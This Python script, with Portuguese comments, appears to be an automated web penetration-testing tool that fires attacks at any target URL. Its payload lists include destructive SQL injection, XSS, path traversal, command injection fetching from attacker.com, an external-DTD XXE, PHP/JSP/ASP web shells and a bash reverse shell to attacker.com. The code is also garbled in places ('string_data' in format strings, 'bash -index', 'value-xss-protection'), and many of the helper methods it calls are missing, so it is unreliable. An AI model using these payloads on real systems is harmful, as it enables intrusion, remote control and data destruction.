#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔒 IMP012: Sistema de Penetration Testing Avançado
🎯 Objetivo: Testes de penetração automatizados e manuais
📅 Criado: 2025-01-27
🔄 Versão: 1.0
📋 Tracing ID: IMP012_PENETRATION_001
"""

import os
import sys
import json
import time
import requests
import subprocess
import asyncio
import aiohttp
import hashlib
import hmac
import base64
import secrets
import re
import ssl
import socket
from datetime import datetime, timedelta
from typing import Dict, List, Tuple, Optional, Any, Union
from dataclasses import dataclass, asdict
from enum import Enum
import logging
import argparse
import concurrent.futures
from pathlib import Path

# Configuração de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)string_data - %(levelname)string_data - [IMP012] %(message)string_data',
    handlers=[
        logging.FileHandler('logs/penetration_testing.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class VulnerabilitySeverity(Enum):
    """Severidades de vulnerabilidades."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

class TestCategory(Enum):
    """Categorias de testes."""
    AUTHENTICATION = "authentication"
    AUTHORIZATION = "authorization"
    INPUT_VALIDATION = "input_validation"
    SESSION_MANAGEMENT = "session_management"
    CRYPTOGRAPHY = "cryptography"
    NETWORK_SECURITY = "network_security"
    API_SECURITY = "api_security"
    WEB_SECURITY = "web_security"
    INFRASTRUCTURE = "infrastructure"

@dataclass
class Vulnerability:
    """Estrutura de vulnerabilidade."""
    id: str
    title: str
    description: str
    severity: VulnerabilitySeverity
    category: TestCategory
    cvss_score: float
    cve_id: Optional[str] = None
    affected_endpoint: Optional[str] = None
    payload: Optional[str] = None
    evidence: Optional[str] = None
    remediation: Optional[str] = None
    references: List[str] = None
    discovered_at: str = None
    status: str = "open"
    
    def __post_init__(self):
        if self.discovered_at is None:
            self.discovered_at = datetime.now().isoformat()
        if self.references is None:
            self.references = []

@dataclass
class TestResult:
    """Resultado de teste individual."""
    test_name: str
    category: TestCategory
    status: str  # PASS, FAIL, WARN, ERROR
    description: str
    duration: float
    evidence: Optional[str] = None
    vulnerability: Optional[Vulnerability] = None
    timestamp: str = None
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now().isoformat()

class PenetrationTester:
    """Sistema avançado de penetration testing."""
    
    def __init__(self, target_url: str, config: Dict = None):
        self.target_url = target_url.rstrip('/')
        self.config = config or self._default_config()
        self.session = requests.Session()
        self.results: List[TestResult] = []
        self.vulnerabilities: List[Vulnerability] = []
        self.test_id = f"PT_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        # Configurar headers padrão
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/html, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        
        logger.info(f"🔒 Iniciando penetration testing para: {target_url}")
        logger.info(f"📋 Test ID: {self.test_id}")
    
    def _default_config(self) -> Dict:
        """Configuração padrão do penetration tester."""
        return {
            'timeout': 30,
            'max_retries': 3,
            'threads': 10,
            'delay_between_requests': 0.1,
            'follow_redirects': True,
            'verify_ssl': False,
            'custom_headers': {},
            'auth_credentials': None,
            'excluded_paths': ['/health', '/metrics', '/robots.txt'],
            'custom_payloads': [],
            'scan_depth': 'medium',  # low, medium, high
            'report_format': 'json'
        }
    
    async def run_full_penetration_test(self) -> Dict:
        """Executar teste de penetração completo."""
        logger.info("🚀 Iniciando teste de penetração completo...")
        
        start_time = time.time()
        
        # Executar todos os testes
        test_methods = [
            self.test_authentication,
            self.test_authorization,
            self.test_sql_injection,
            self.test_xss,
            self.test_csrf,
            self.test_path_traversal,
            self.test_command_injection,
            self.test_ssrf,
            self.test_xxe,
            self.test_open_redirect,
            self.test_file_upload,
            self.test_session_management,
            self.test_rate_limiting,
            self.test_ssl_tls,
            self.test_headers_security,
            self.test_api_security,
            self.test_infrastructure
        ]
        
        # Executar testes em paralelo
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.config['threads']) as executor:
            futures = [executor.submit(self._run_test_sync, method) for method in test_methods]
            concurrent.futures.wait(futures)
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Gerar relatório
        report = self._generate_report(duration)
        
        logger.info(f"✅ Teste de penetração concluído em {duration:.2f}string_data")
        logger.info(f"📊 Vulnerabilidades encontradas: {len(self.vulnerabilities)}")
        
        return report
    
    def _run_test_sync(self, test_method):
        """Executar teste de forma síncrona."""
        try:
            asyncio.run(test_method())
        except Exception as e:
            logger.error(f"❌ Erro no teste {test_method.__name__}: {str(e)}")
    
    async def test_authentication(self):
        """Testar vulnerabilidades de autenticação."""
        logger.info("🔐 Testando vulnerabilidades de autenticação...")
        
        test_cases = [
            {
                'name': 'Weak Password Policy',
                'payloads': ['123456', 'password', 'admin', 'test'],
                'endpoint': '/api/auth/login'
            },
            {
                'name': 'Account Enumeration',
                'payloads': ['admin@test.com', 'user@test.com', 'nonexistent@test.com'],
                'endpoint': '/api/auth/forgot-password'
            },
            {
                'name': 'Brute Force Protection',
                'payloads': ['admin'] * 10,  # Tentativas repetidas
                'endpoint': '/api/auth/login'
            }
        ]
        
        for test_case in test_cases:
            await self._test_authentication_case(test_case)
    
    async def test_authorization(self):
        """Testar vulnerabilidades de autorização."""
        logger.info("🔑 Testando vulnerabilidades de autorização...")
        
        # Testar acesso a recursos sem autenticação
        protected_endpoints = [
            '/api/admin/users',
            '/api/admin/settings',
            '/api/user/profile',
            '/api/admin/reports'
        ]
        
        for endpoint in protected_endpoints:
            await self._test_authorization_endpoint(endpoint)
    
    async def test_sql_injection(self):
        """Testar vulnerabilidades de SQL Injection."""
        logger.info("💉 Testando vulnerabilidades de SQL Injection...")
        
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "1' OR '1' = '1' --",
            "' OR 1=1#",
            "' OR 1=1/*",
            "'; EXEC xp_cmdshell('dir'); --",
            "' UNION SELECT username,password FROM users --",
            "'; WAITFOR DELAY '00:00:05'--"
        ]
        
        test_endpoints = [
            '/api/auth/login',
            '/api/search',
            '/api/users',
            '/api/keywords'
        ]
        
        for endpoint in test_endpoints:
            for payload in sql_payloads:
                await self._test_sql_injection_case(endpoint, payload)
    
    async def test_xss(self):
        """Testar vulnerabilidades de XSS."""
        logger.info("🕷️ Testando vulnerabilidades de XSS...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=value onerror=alert('XSS')>",
            "';alert('XSS');//",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<details open ontoggle=alert('XSS')>",
            "<video><source onerror=alert('XSS')>"
        ]
        
        test_endpoints = [
            '/api/search',
            '/api/comments',
            '/api/feedback',
            '/api/user/profile'
        ]
        
        for endpoint in test_endpoints:
            for payload in xss_payloads:
                await self._test_xss_case(endpoint, payload)
    
    async def test_csrf(self):
        """Testar vulnerabilidades de CSRF."""
        logger.info("🔄 Testando vulnerabilidades de CSRF...")
        
        # Testar endpoints que modificam dados
        csrf_endpoints = [
            {'url': '/api/user/profile', 'method': 'PUT'},
            {'url': '/api/keywords', 'method': 'POST'},
            {'url': '/api/settings', 'method': 'POST'},
            {'url': '/api/auth/logout', 'method': 'POST'}
        ]
        
        for endpoint in csrf_endpoints:
            await self._test_csrf_endpoint(endpoint)
    
    async def test_path_traversal(self):
        """Testar vulnerabilidades de Path Traversal."""
        logger.info("📁 Testando vulnerabilidades de Path Traversal...")
        
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        ]
        
        test_endpoints = [
            '/api/files/',
            '/api/download/',
            '/api/upload/',
            '/api/static/'
        ]
        
        for endpoint in test_endpoints:
            for payload in path_payloads:
                await self._test_path_traversal_case(endpoint, payload)
    
    async def test_command_injection(self):
        """Testar vulnerabilidades de Command Injection."""
        logger.info("⚡ Testando vulnerabilidades de Command Injection...")
        
        command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "`id`",
            "$(whoami)",
            "; ping -c 1 127.0.0.1",
            "| wget http://attacker.com/shell",
            "&& curl http://attacker.com/backdoor"
        ]
        
        test_endpoints = [
            '/api/system/command',
            '/api/admin/execute',
            '/api/debug/command'
        ]
        
        for endpoint in test_endpoints:
            for payload in command_payloads:
                await self._test_command_injection_case(endpoint, payload)
    
    async def test_ssrf(self):
        """Testar vulnerabilidades de SSRF."""
        logger.info("🌐 Testando vulnerabilidades de SSRF...")
        
        ssrf_payloads = [
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:6379",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            "http://169.254.169.254/latest/user-data/",
            "file:///etc/passwd",
            "dict://127.0.0.1:11211/stat"
        ]
        
        test_endpoints = [
            '/api/proxy/',
            '/api/fetch/',
            '/api/url/',
            '/api/webhook/'
        ]
        
        for endpoint in test_endpoints:
            for payload in ssrf_payloads:
                await self._test_ssrf_case(endpoint, payload)
    
    async def test_xxe(self):
        """Testar vulnerabilidades de XXE."""
        logger.info("📄 Testando vulnerabilidades de XXE...")
        
        xxe_payloads = [
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/hostname">]><data>&file;</data>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><data>&exploit;</data>'
        ]
        
        test_endpoints = [
            '/api/xml/parse',
            '/api/upload/xml',
            '/api/import/xml'
        ]
        
        for endpoint in test_endpoints:
            for payload in xxe_payloads:
                await self._test_xxe_case(endpoint, payload)
    
    async def test_open_redirect(self):
        """Testar vulnerabilidades de Open Redirect."""
        logger.info("🔄 Testando vulnerabilidades de Open Redirect...")
        
        redirect_payloads = [
            "https://evil.com",
            "javascript:alert('redirect')",
            "data:text/html,<script>alert('redirect')</script>",
            "//evil.com",
            "\\evil.com"
        ]
        
        test_endpoints = [
            '/api/auth/callback',
            '/api/redirect',
            '/api/oauth/callback'
        ]
        
        for endpoint in test_endpoints:
            for payload in redirect_payloads:
                await self._test_open_redirect_case(endpoint, payload)
    
    async def test_file_upload(self):
        """Testar vulnerabilidades de File Upload."""
        logger.info("📤 Testando vulnerabilidades de File Upload...")
        
        malicious_files = [
            ('shell.php', '<?php system($_GET["cmd"]); ?>'),
            ('shell.jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'),
            ('shell.asp', '<% Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()) %>'),
            ('shell.py', 'import os; os.system(request.args.get("cmd"))'),
            ('shell.sh', '#!/bin/bash\nbash -index >& /dev/tcp/attacker.com/4444 0>&1')
        ]
        
        test_endpoints = [
            '/api/upload/file',
            '/api/upload/image',
            '/api/upload/document'
        ]
        
        for endpoint in test_endpoints:
            for filename, content in malicious_files:
                await self._test_file_upload_case(endpoint, filename, content)
    
    async def test_session_management(self):
        """Testar vulnerabilidades de Session Management."""
        logger.info("🔐 Testando vulnerabilidades de Session Management...")
        
        # Testar força bruta em sessões
        await self._test_session_brute_force()
        
        # Testar previsibilidade de sessões
        await self._test_session_predictability()
        
        # Testar expiração de sessões
        await self._test_session_expiration()
    
    async def test_rate_limiting(self):
        """Testar proteção contra Rate Limiting."""
        logger.info("⏱️ Testando proteção contra Rate Limiting...")
        
        # Testar limite de requisições
        await self._test_rate_limit_bypass()
    
    async def test_ssl_tls(self):
        """Testar configurações SSL/TLS."""
        logger.info("🔒 Testando configurações SSL/TLS...")
        
        # Testar versões de TLS
        await self._test_tls_versions()
        
        # Testar cifras
        await self._test_cipher_suites()
        
        # Testar certificados
        await self._test_certificates()
    
    async def test_headers_security(self):
        """Testar headers de segurança."""
        logger.info("🛡️ Testando headers de segurança...")
        
        security_headers = [
            'X-Frame-Options',
            'X-Content-Type-Options',
            'X-XSS-Protection',
            'Strict-Transport-Security',
            'Content-Security-Policy',
            'Referrer-Policy',
            'Permissions-Policy'
        ]
        
        await self._test_security_headers(security_headers)
    
    async def test_api_security(self):
        """Testar segurança de APIs."""
        logger.info("🔌 Testando segurança de APIs...")
        
        # Testar autenticação de API
        await self._test_api_authentication()
        
        # Testar autorização de API
        await self._test_api_authorization()
        
        # Testar validação de entrada
        await self._test_api_input_validation()
    
    async def test_infrastructure(self):
        """Testar segurança da infraestrutura."""
        logger.info("🏗️ Testando segurança da infraestrutura...")
        
        # Testar portas abertas
        await self._test_open_ports()
        
        # Testar serviços expostos
        await self._test_exposed_services()
        
        # Testar configurações de firewall
        await self._test_firewall_configuration()
    
    # Métodos auxiliares para testes específicos
    async def _test_authentication_case(self, test_case: Dict):
        """Testar caso específico de autenticação."""
        start_time = time.time()
        
        try:
            for payload in test_case['payloads']:
                response = await self._make_request(
                    'POST',
                    test_case['endpoint'],
                    data={'username': payload, 'password': payload}
                )
                
                # Analisar resposta para detectar vulnerabilidades
                if self._detect_authentication_vulnerability(response, test_case['name']):
                    self._add_vulnerability(
                        title=f"Authentication Vulnerability: {test_case['name']}",
                        description=f"Vulnerability detected in {test_case['endpoint']}",
                        severity=VulnerabilitySeverity.HIGH,
                        category=TestCategory.AUTHENTICATION,
                        cvss_score=7.5,
                        affected_endpoint=test_case['endpoint'],
                        payload=payload,
                        evidence=str(response.status_code)
                    )
            
            duration = time.time() - start_time
            self._add_result(
                test_name=f"Authentication: {test_case['name']}",
                category=TestCategory.AUTHENTICATION,
                status="PASS",
                description=f"Tested {test_case['name']}",
                duration=duration
            )
            
        except Exception as e:
            duration = time.time() - start_time
            self._add_result(
                test_name=f"Authentication: {test_case['name']}",
                category=TestCategory.AUTHENTICATION,
                status="ERROR",
                description=f"Error: {str(e)}",
                duration=duration
            )
    
    async def _test_authorization_endpoint(self, endpoint: str):
        """Testar endpoint para vulnerabilidades de autorização."""
        start_time = time.time()
        
        try:
            response = await self._make_request('GET', endpoint)
            
            # Verificar se endpoint está protegido
            if response.status_code in [200, 201, 202]:
                self._add_vulnerability(
                    title="Authorization Bypass",
                    description=f"Endpoint {endpoint} accessible without authentication",
                    severity=VulnerabilitySeverity.HIGH,
                    category=TestCategory.AUTHORIZATION,
                    cvss_score=8.0,
                    affected_endpoint=endpoint,
                    evidence=f"Status: {response.status_code}"
                )
            
            duration = time.time() - start_time
            self._add_result(
                test_name=f"Authorization: {endpoint}",
                category=TestCategory.AUTHORIZATION,
                status="PASS",
                description=f"Tested authorization for {endpoint}",
                duration=duration
            )
            
        except Exception as e:
            duration = time.time() - start_time
            self._add_result(
                test_name=f"Authorization: {endpoint}",
                category=TestCategory.AUTHORIZATION,
                status="ERROR",
                description=f"Error: {str(e)}",
                duration=duration
            )
    
    async def _test_sql_injection_case(self, endpoint: str, payload: str):
        """Testar caso específico de SQL Injection."""
        start_time = time.time()
        
        try:
            # Testar diferentes parâmetros
            test_params = ['id', 'search', 'query', 'user', 'email']
            
            for param in test_params:
                response = await self._make_request(
                    'GET',
                    endpoint,
                    params={param: payload}
                )
                
                # Detectar SQL Injection
                if self._detect_sql_injection(response, payload):
                    self._add_vulnerability(
                        title="SQL Injection",
                        description=f"SQL injection detected in {endpoint} parameter {param}",
                        severity=VulnerabilitySeverity.CRITICAL,
                        category=TestCategory.INPUT_VALIDATION,
                        cvss_score=9.0,
                        affected_endpoint=endpoint,
                        payload=payload,
                        evidence=f"Parameter: {param}, Status: {response.status_code}"
                    )
            
            duration = time.time() - start_time
            self._add_result(
                test_name=f"SQL Injection: {endpoint}",
                category=TestCategory.INPUT_VALIDATION,
                status="PASS",
                description=f"Tested SQL injection for {endpoint}",
                duration=duration
            )
            
        except Exception as e:
            duration = time.time() - start_time
            self._add_result(
                test_name=f"SQL Injection: {endpoint}",
                category=TestCategory.INPUT_VALIDATION,
                status="ERROR",
                description=f"Error: {str(e)}",
                duration=duration
            )
    
    async def _test_xss_case(self, endpoint: str, payload: str):
        """Testar caso específico de XSS."""
        start_time = time.time()
        
        try:
            # Testar diferentes parâmetros
            test_params = ['search', 'comment', 'name', 'description']
            
            for param in test_params:
                response = await self._make_request(
                    'POST',
                    endpoint,
                    data={param: payload}
                )
                
                # Detectar XSS
                if self._detect_xss(response, payload):
                    self._add_vulnerability(
                        title="Cross-Site Scripting (XSS)",
                        description=f"XSS detected in {endpoint} parameter {param}",
                        severity=VulnerabilitySeverity.HIGH,
                        category=TestCategory.INPUT_VALIDATION,
                        cvss_score=7.5,
                        affected_endpoint=endpoint,
                        payload=payload,
                        evidence=f"Parameter: {param}, Status: {response.status_code}"
                    )
            
            duration = time.time() - start_time
            self._add_result(
                test_name=f"XSS: {endpoint}",
                category=TestCategory.INPUT_VALIDATION,
                status="PASS",
                description=f"Tested XSS for {endpoint}",
                duration=duration
            )
            
        except Exception as e:
            duration = time.time() - start_time
            self._add_result(
                test_name=f"XSS: {endpoint}",
                category=TestCategory.INPUT_VALIDATION,
                status="ERROR",
                description=f"Error: {str(e)}",
                duration=duration
            )
    
    # Métodos auxiliares para detecção
    def _detect_authentication_vulnerability(self, response, test_name: str) -> bool:
        """Detectar vulnerabilidades de autenticação."""
        # Implementar lógica de detecção específica
        if test_name == "Weak Password Policy":
            return response.status_code == 200 and "token" in response.text.lower()
        elif test_name == "Account Enumeration":
            return response.status_code == 200 and "exists" in response.text.lower()
        elif test_name == "Brute Force Protection":
            return response.status_code == 200  # Deveria ser bloqueado
        return False
    
    def _detect_sql_injection(self, response, payload: str) -> bool:
        """Detectar SQL Injection."""
        # Padrões de erro SQL
        sql_errors = [
            "sql syntax",
            "mysql_fetch_array",
            "ora-",
            "postgresql",
            "sqlite",
            "microsoft ole db provider",
            "unclosed quotation mark"
        ]
        
        response_text = response.text.lower()
        for error in sql_errors:
            if error in response_text:
                return True
        
        # Detectar diferenças de tempo (time-based)
        if "waitfor delay" in payload.lower() or "sleep" in payload.lower():
            return response.elapsed.total_seconds() > 5
        
        return False
    
    def _detect_xss(self, response, payload: str) -> bool:
        """Detectar XSS."""
        # Verificar se payload foi refletido na resposta
        if payload.lower() in response.text.lower():
            return True
        
        # Verificar headers de resposta
        if 'value-xss-protection' not in response.headers:
            return True
        
        return False
    
    # Métodos auxiliares
    async def _make_request(self, method: str, endpoint: str, **kwargs) -> requests.Response:
        """Fazer requisição HTTP."""
        url = f"{self.target_url}{endpoint}"
        
        try:
            response = self.session.request(
                method=method,
                url=url,
                timeout=self.config['timeout'],
                allow_redirects=self.config['follow_redirects'],
                verify=self.config['verify_ssl'],
                **kwargs
            )
            
            # Delay entre requisições
            await asyncio.sleep(self.config['delay_between_requests'])
            
            return response
            
        except requests.exceptions.RequestException as e:
            logger.error(f"❌ Erro na requisição {method} {url}: {str(e)}")
            raise
    
    def _add_vulnerability(self, **kwargs):
        """Adicionar vulnerabilidade encontrada."""
        vuln = Vulnerability(**kwargs)
        self.vulnerabilities.append(vuln)
        logger.warning(f"⚠️ Vulnerabilidade encontrada: {vuln.title}")
    
    def _add_result(self, **kwargs):
        """Adicionar resultado de teste."""
        result = TestResult(**kwargs)
        self.results.append(result)
    
    def _generate_report(self, duration: float) -> Dict:
        """Gerar relatório completo."""
        # Calcular estatísticas
        total_tests = len(self.results)
        passed_tests = len([r for r in self.results if r.status == "PASS"])
        failed_tests = len([r for r in self.results if r.status == "FAIL"])
        error_tests = len([r for r in self.results if r.status == "ERROR"])
        
        # Contar vulnerabilidades por severidade
        vuln_by_severity = {}
        for vuln in self.vulnerabilities:
            severity = vuln.severity.value
            vuln_by_severity[severity] = vuln_by_severity.get(severity, 0) + 1
        
        # Calcular score de segurança
        security_score = self._calculate_security_score()
        
        report = {
            'test_id': self.test_id,
            'target_url': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'duration': duration,
            'summary': {
                'total_tests': total_tests,
                'passed_tests': passed_tests,
                'failed_tests': failed_tests,
                'error_tests': error_tests,
                'success_rate': (passed_tests / total_tests * 100) if total_tests > 0 else 0,
                'total_vulnerabilities': len(self.vulnerabilities),
                'vulnerabilities_by_severity': vuln_by_severity,
                'security_score': security_score
            },
            'results': [asdict(result) for result in self.results],
            'vulnerabilities': [asdict(vuln) for vuln in self.vulnerabilities],
            'recommendations': self._generate_recommendations(),
            'metadata': {
                'tester_version': '1.0',
                'config': self.config
            }
        }
        
        # Salvar relatório
        self._save_report(report)
        
        return report
    
    def _calculate_security_score(self) -> int:
        """Calcular score de segurança (0-100)."""
        score = 100
        
        # Penalizar por vulnerabilidades
        for vuln in self.vulnerabilities:
            if vuln.severity == VulnerabilitySeverity.CRITICAL:
                score -= 20
            elif vuln.severity == VulnerabilitySeverity.HIGH:
                score -= 15
            elif vuln.severity == VulnerabilitySeverity.MEDIUM:
                score -= 10
            elif vuln.severity == VulnerabilitySeverity.LOW:
                score -= 5
        
        return max(0, score)
    
    def _generate_recommendations(self) -> List[str]:
        """Gerar recomendações baseadas nas vulnerabilidades encontradas."""
        recommendations = []
        
        for vuln in self.vulnerabilities:
            if vuln.remediation:
                recommendations.append(f"{vuln.title}: {vuln.remediation}")
        
        # Recomendações gerais
        if len(self.vulnerabilities) > 0:
            recommendations.append("Implementar WAF (Web Application Firewall)")
            recommendations.append("Configurar monitoramento de segurança em tempo real")
            recommendations.append("Estabelecer processo de patch de segurança")
        
        return recommendations
    
    def _save_report(self, report: Dict):
        """Salvar relatório em arquivo."""
        # Criar diretório se não existir
        os.makedirs('reports/security', exist_ok=True)
        
        # Salvar relatório JSON
        json_file = f"reports/security/penetration_test_{self.test_id}.json"
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        # Salvar relatório HTML
        html_file = f"reports/security/penetration_test_{self.test_id}.html"
        self._generate_html_report(report, html_file)
        
        # Salvar relatório Markdown
        md_file = f"reports/security/penetration_test_{self.test_id}.md"
        self._generate_markdown_report(report, md_file)
        
        logger.info(f"📄 Relatórios salvos:")
        logger.info(f"   JSON: {json_file}")
        logger.info(f"   HTML: {html_file}")
        logger.info(f"   Markdown: {md_file}")
    
    def _generate_html_report(self, report: Dict, filename: str):
        """Gerar relatório HTML."""
        html_content = f"""
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Relatório de Penetration Testing - {report['test_id']}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .header {{ background: #f0f0f0; padding: 20px; border-radius: 5px; }}
        .summary {{ background: #e8f5e8; padding: 15px; border-radius: 5px; margin: 20px 0; }}
        .vulnerability {{ background: #fff3cd; padding: 10px; margin: 10px 0; border-left: 4px solid #ffc107; }}
        .critical {{ border-left-color: #dc3545; }}
        .high {{ border-left-color: #fd7e14; }}
        .medium {{ border-left-color: #ffc107; }}
        .low {{ border-left-color: #28a745; }}
        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #f2f2f2; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🔒 Relatório de Penetration Testing</h1>
        <p><strong>Test ID:</strong> {report['test_id']}</p>
        <p><strong>Target:</strong> {report['target_url']}</p>
        <p><strong>Data:</strong> {report['timestamp']}</p>
        <p><strong>Duração:</strong> {report['duration']:.2f}string_data</p>
    </div>
    
    <div class="summary">
        <h2>📊 Resumo</h2>
        <p><strong>Score de Segurança:</strong> {report['summary']['security_score']}/100</p>
        <p><strong>Total de Testes:</strong> {report['summary']['total_tests']}</p>
        <p><strong>Testes Aprovados:</strong> {report['summary']['passed_tests']}</p>
        <p><strong>Vulnerabilidades Encontradas:</strong> {report['summary']['total_vulnerabilities']}</p>
    </div>
    
    <h2>🚨 Vulnerabilidades</h2>
"""
        
        for vuln in report['vulnerabilities']:
            severity_class = vuln['severity']
            html_content += f"""
    <div class="vulnerability {severity_class}">
        <h3>{vuln['title']}</h3>
        <p><strong>Severidade:</strong> {vuln['severity'].upper()}</p>
        <p><strong>CVSS Score:</strong> {vuln['cvss_score']}</p>
        <p><strong>Descrição:</strong> {vuln['description']}</p>
        <p><strong>Endpoint:</strong> {vuln['affected_endpoint']}</p>
        <p><strong>Payload:</strong> <code>{vuln['payload']}</code></p>
        <p><strong>Remediação:</strong> {vuln['remediation']}</p>
    </div>
"""
        
        html_content += """
</body>
</html>
"""
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
    
    def _generate_markdown_report(self, report: Dict, filename: str):
        """Gerar relatório Markdown."""
        md_content = f"""# 🔒 Relatório de Penetration Testing

**Test ID:** {report['test_id']}  
**Target:** {report['target_url']}  
**Data:** {report['timestamp']}  
**Duração:** {report['duration']:.2f}string_data  

## 📊 Resumo

- **Score de Segurança:** {report['summary']['security_score']}/100
- **Total de Testes:** {report['summary']['total_tests']}
- **Testes Aprovados:** {report['summary']['passed_tests']}
- **Vulnerabilidades Encontradas:** {report['summary']['total_vulnerabilities']}

## 🚨 Vulnerabilidades

"""
        
        for vuln in report['vulnerabilities']:
            md_content += f"""### {vuln['title']}

- **Severidade:** {vuln['severity'].upper()}
- **CVSS Score:** {vuln['cvss_score']}
- **Descrição:** {vuln['description']}
- **Endpoint:** {vuln['affected_endpoint']}
- **Payload:** `{vuln['payload']}`
- **Remediação:** {vuln['remediation']}

---
"""
        
        md_content += f"""
## 📋 Recomendações

"""
        
        for rec in report['recommendations']:
            md_content += f"- {rec}\n"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(md_content)

async def main():
    """Função principal."""
    parser = argparse.ArgumentParser(description='Penetration Testing Tool')
    parser.add_argument('target', help='Target URL to test')
    parser.add_argument('--config', help='Configuration file (JSON)')
    parser.add_argument('--output', help='Output directory for reports')
    parser.add_argument('--verbose', '-value', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    # Configurar logging
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Carregar configuração
    config = {}
    if args.config:
        with open(args.config, 'r') as f:
            config = json.load(f)
    
    # Criar tester
    tester = PenetrationTester(args.target, config)
    
    # Executar teste
    try:
        report = await tester.run_full_penetration_test()
        
        # Exibir resumo
        print(f"\n{'='*60}")
        print(f"🔒 RELATÓRIO DE PENETRATION TESTING")
        print(f"{'='*60}")
        print(f"🎯 Target: {report['target_url']}")
        print(f"📋 Test ID: {report['test_id']}")
        print(f"⏱️ Duração: {report['duration']:.2f}string_data")
        print(f"📊 Score de Segurança: {report['summary']['security_score']}/100")
        print(f"🧪 Total de Testes: {report['summary']['total_tests']}")
        print(f"✅ Testes Aprovados: {report['summary']['passed_tests']}")
        print(f"❌ Testes Falharam: {report['summary']['failed_tests']}")
        print(f"🚨 Vulnerabilidades: {report['summary']['total_vulnerabilities']}")
        
        if report['summary']['total_vulnerabilities'] > 0:
            print(f"\n🚨 VULNERABILIDADES ENCONTRADAS:")
            for vuln in report['vulnerabilities']:
                print(f"   • {vuln['severity'].upper()}: {vuln['title']}")
        
        print(f"\n📄 Relatórios salvos em: reports/security/")
        
    except KeyboardInterrupt:
        print("\n⚠️ Teste interrompido pelo usuário")
    except Exception as e:
        print(f"\n❌ Erro durante o teste: {str(e)}")
        logger.error(f"Erro fatal: {str(e)}")

if __name__ == "__main__":
    asyncio.run(main()) 